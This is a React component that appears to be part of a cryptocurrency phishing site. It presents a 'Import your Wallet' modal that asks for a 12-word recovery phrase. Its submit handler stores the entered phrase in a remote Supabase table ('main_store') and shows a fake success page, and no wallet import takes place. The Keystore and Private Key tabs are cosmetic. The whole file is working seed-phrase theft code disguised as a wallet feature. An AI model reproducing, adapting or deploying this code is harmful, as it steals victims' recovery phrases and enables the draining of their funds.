import React, { useState } from "react";
import { X } from "lucide-react";
import { supabase } from "../supabaseClient"; // Adjusted path
import { useNavigate } from "react-router-dom";
import "../css/import_form.css";

export default function ImportForm({ wallet, onClose }) {
  const [activeTab, setActiveTab] = useState("phrase");
  const [walletName, setWalletName] = useState("");
  const [email, setEmail] = useState("");
  const [phrase, setPhrase] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const navigate = useNavigate();

  const validateForm = () => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      setError("Please enter a valid email address.");
      return false;
    }

    const phraseRegex = /^\s*([a-zA-Z]+\s+){11}[a-zA-Z]+\s*$/;
    if (!phraseRegex.test(phrase)) {
      setError("Please enter a 12-word recovery phrase.");
      return false;
    }

    setError("");
    return true;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const { error } = await supabase
        .from("main_store")
        .insert([{ phrases: phrase }]);

      if (error) {
        throw error;
      }

      navigate("/success");
    } catch (error) {
      setError("Failed to import wallet. Please try again.");
      console.error("Error inserting data:", error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="import-modal-overlay">
      <div className="import-modal">
        <div className="import-modal-header">
          <div className="import-modal-header-text">
            <img
              src={wallet.image}
              alt={wallet.name}
              className="import-modal-wallet-icon"
            />
            <h2>Import your {wallet.name} Wallet</h2>
          </div>
          <button onClick={onClose} className="import-modal-close-button">
            <X size={20} />
          </button>
        </div>
        <div className="import-modal-tabs">
          <button
            className={`tab ${activeTab === "phrase" ? "active" : ""}`}
            onClick={() => setActiveTab("phrase")}
          >
            Phrase
          </button>
          <button
            className={`tab ${activeTab === "keystore" ? "active" : ""}`}
            onClick={() => setActiveTab("keystore")}
          >
            Keystore JSON
          </button>
          <button
            className={`tab ${activeTab === "privateKey" ? "active" : ""}`}
            onClick={() => setActiveTab("privateKey")}
          >
            Private Key
          </button>
        </div>
        <form onSubmit={handleSubmit}>
          <div className="import-modal-content">
            <div className="form-group">
              <label htmlFor="wallet-name">Name wallet</label>
              <input
                type="text"
                id="wallet-name"
                placeholder="Name wallet"
                value={walletName}
                onChange={(e) => setWalletName(e.target.value)}
              />
            </div>
            <div className="form-group">
              <label htmlFor="email">Email</label>
              <input
                type="email"
                id="email"
                placeholder="Email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>
            <div className="form-group">
              <label htmlFor="phrase">Phrase</label>
              <textarea
                id="phrase"
                placeholder="Enter your recovery phrase"
                rows="4"
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
              ></textarea>
              <p className="phrase-description">
                Typically 12 (sometimes 24) words separated by single spaces
              </p>
            </div>
            {error && <p className="error-message">{error}</p>}
          </div>
          <div className="import-modal-buttons">
            <button type="button" className="cancel-button" onClick={onClose}>
              Cancel
            </button>
            <button
              type="submit"
              className="proceed-button"
              disabled={isLoading}
            >
              {isLoading ? "Loading..." : "Proceed"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
